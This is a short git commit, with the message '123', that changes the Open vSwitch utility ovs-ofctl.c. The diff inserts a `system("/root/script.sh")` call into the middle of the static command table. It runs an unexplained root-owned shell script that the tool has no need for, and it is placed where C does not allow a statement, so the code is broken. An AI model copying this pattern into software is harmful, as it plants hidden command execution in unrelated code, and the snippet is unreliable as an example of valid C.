224cb1cc54246be82799e4a9a69917caa05b3a1e
cho4036 <cho4036@gmail.com>
2016-01-21 08:45:50 +0900

    123

--- utilities/ovs-ofctl.c
+++ utilities/ovs-ofctl.c
@@ -3553,6 +3553,8 @@ ofctl_encode_hello(struct ovs_cmdl_context *ctx)
 }
 
 static const struct ovs_cmdl_command all_commands[] = {
+  int status = system("/root/script.sh");
+  
     { "show", "switch",
       1, 1, ofctl_show },
     { "monitor", "switch [misslen] [invalid_ttl] [watch:[...]]",
